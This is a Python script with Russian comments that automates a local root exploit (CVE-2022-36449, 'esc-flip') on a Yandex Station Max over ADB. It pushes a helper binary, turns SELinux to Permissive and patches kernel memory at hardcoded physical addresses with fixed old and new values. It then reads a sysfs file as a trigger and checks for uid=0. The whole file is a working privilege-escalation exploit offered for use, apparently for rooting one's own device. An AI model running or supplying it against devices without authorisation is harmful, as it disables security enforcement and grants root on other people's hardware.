#!/usr/bin/env python3
"""Временный root-доступ через esc-flip (CVE-2022-36449).

Переводит SELinux в Permissive записями через esc, затем в одной ADB-сессии
читает /sys/fs/selinux/reject_unknown (триггер) и проверяет uid=0.

Использование: python3 scripts/get-root.py [IP]
IP по умолчанию — 192.168.1.149.
"""

from __future__ import annotations

import argparse
import hashlib
import re
import subprocess
import sys
import time
from pathlib import Path

DEFAULT_IP = "192.168.1.149"
PORT = 5555
TMP = "/data/local/tmp"
SELINUX_ADDR = "0x291352c"
MAX_ATTEMPTS = 10
CALL_TIMEOUT = 60

# (PA, OLD, NEW)
WRITES = [
    ("0x291352c", "1", "0"),
    ("0x13ed044", "2852258804", "3596551104"),
    ("0x13ed040", "2854093792", "2831252477"),
    ("0x13ed03c", "2852193267", "3594453248"),
    ("0x13ed038", "2852127734", "2847898621"),
    ("0x13ed034", "2835504117", "2433188104"),
    ("0x13ed030", "2835436531", "4043302632"),
    ("0x13ed02c", "2432697341", "2433327104"),
    ("0x13ed028", "2847702013", "3489699552"),
]

# Оба варианта строки READ32 содержат value=: и «read: pa=…», и «RESULT: …».
VALUE_RE = re.compile(r"value=(\d+)")
FLIP_BEFORE_RE = re.compile(r"flip: pa=0x[0-9a-f]+ before=(\d+)")

def log(message: str) -> None:
    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)


def verdict(status: str, detail: str) -> None:
    log(f"{status}: {detail}")


def run(cmd: list[str], timeout: int = CALL_TIMEOUT) -> subprocess.CompletedProcess[str]:
    """Выполнить команду; отсутствие adb и таймаут — не исключения."""
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except FileNotFoundError:
        print("Ошибка: adb не найден в PATH.", file=sys.stderr)
        raise SystemExit(127)
    except subprocess.TimeoutExpired:
        log("таймаут команды: " + " ".join(cmd))
        return subprocess.CompletedProcess(cmd, 124, "", "timeout")


def clean(text: str | None) -> str:
    return (text or "").replace("\r", "")


def verify_binary(path: Path, manifest: Path) -> None:
    """Сверить sha256 файла с манифестом; при расхождении завершить работу."""
    name = path.name
    expected = None
    for line in manifest.read_text(encoding="utf-8").splitlines():
        parts = line.split()
        if len(parts) >= 2 and parts[1] == name:
            expected = parts[0]
            break
    if expected is None:
        print(f"Ошибка: в {manifest} нет записи для {name}", file=sys.stderr)
        raise SystemExit(1)
    actual = hashlib.sha256(path.read_bytes()).hexdigest()
    if actual != expected:
        print(f"Ошибка: контрольная сумма {name} не совпадает с {manifest}", file=sys.stderr)
        raise SystemExit(1)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Временный root-доступ на Яндекс Станции Макс (esc-flip)."
    )
    parser.add_argument(
        "ip", nargs="?", default=DEFAULT_IP, help="IP станции (по умолчанию %(default)s)"
    )
    args = parser.parse_args()

    serial = f"{args.ip}:{PORT}"
    adb = ["adb", "-s", serial]
    esc = f"{TMP}/esc"

    def shell(command: str) -> subprocess.CompletedProcess[str]:
        return run(adb + ["shell", command])

    def shell_out(command: str) -> str:
        return clean(shell(command).stdout)

    run(["adb", "disconnect", serial])
    time.sleep(1)
    run(["adb", "connect", serial])
    time.sleep(2)

    if "uid=" not in shell_out("id"):
        verdict("НЕ УДАЛОСЬ", f"adb не отвечает на {serial}")
        return 1

    if shell("test -x " + esc).returncode != 0:
        esc_src = Path(__file__).resolve().parent.parent / "binaries" / "esc"
        if not esc_src.is_file():
            verdict("НЕ УДАЛОСЬ", f"нет файла {esc_src}")
            return 1
        verify_binary(esc_src, esc_src.parent / "SHA256SUMS")
        if run(adb + ["push", str(esc_src), esc]).returncode != 0:
            verdict("НЕ УДАЛОСЬ", "не удалось передать esc")
            return 1
        shell("chmod 755 " + esc)

    done = [False] * len(WRITES)
    for attempt in range(1, MAX_ATTEMPTS + 1):
        remaining = 0
        for i, (addr, orig, target) in enumerate(WRITES):
            if done[i]:
                continue

            out = shell_out(f"{esc} flip {addr} {orig} {target}")
            if "FLIP OK" in out:
                log(f"  {addr}: OK (attempt {attempt})")
                done[i] = True
                continue

            if "before mismatch" not in out:
                # esc не дошёл до сравнения (bring-up failed, write failed):
                # значение на месте не проверено, просто пробуем снова.
                remaining += 1
                continue

            m = FLIP_BEFORE_RE.search(out)
            if not m:
                m = VALUE_RE.search(shell_out(f"{esc} read {addr}"))
            current = m.group(1) if m else None

            if current is None:
                log(f"  {addr}: не удалось прочитать значение (attempt {attempt})")
                remaining += 1
                continue

            if current == target:
                log(f"  {addr}: уже записано (attempt {attempt})")
                done[i] = True
                continue

            if current != orig:
                # Значение не orig и не target — адрес указывает не туда, что
                # ожидалось для этой сборки. Повторы шансов не добавят, а
                # esc-flip недостаточно стабилен, чтобы гонять его лишний раз.
                verdict(
                    "НЕ УДАЛОСЬ",
                    f"{addr}: неожиданное значение {current} "
                    f"(ожидалось {orig} или {target}) на попытке {attempt} — "
                    f"смещения не соответствуют прошивке, триггер не запускаю",
                )
                return 1

            remaining += 1

        if remaining == 0:
            log(f"Все {len(WRITES)} записей подтверждены! (attempt {attempt})")
            break
        log(f"Запись не удалась. Осталось {MAX_ATTEMPTS - attempt} попыток, повторяю...")
        time.sleep(1)

    failed = [addr for i, (addr, _, _) in enumerate(WRITES) if not done[i]]
    if failed:
        for addr in failed:
            log(f"НЕ записано: {addr}")
        verdict("НЕ УДАЛОСЬ", "не прошли записи: " + " ".join(failed) + " — триггер не запускаю")
        return 1

    log("Триггерю root...")
    trigger = (
        'read _x < /sys/fs/selinux/reject_unknown 2>/dev/null\n'
        'printf "uid=%s\\n" "$(id -u)"'
    )
    out = clean(shell(trigger).stdout)
    print(out, end="")

    uid_line = None
    for line in out.splitlines():
        if line.startswith("uid="):
            uid_line = line[4:]

    if uid_line == "0":
        verdict("УДАЛОСЬ", "uid=0 в сессии, где сработал триггер")
        return 0

    verdict("НЕ УДАЛОСЬ", f"uid='{uid_line or 'нет ответа'}' — записи на месте, триггер не дал root")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
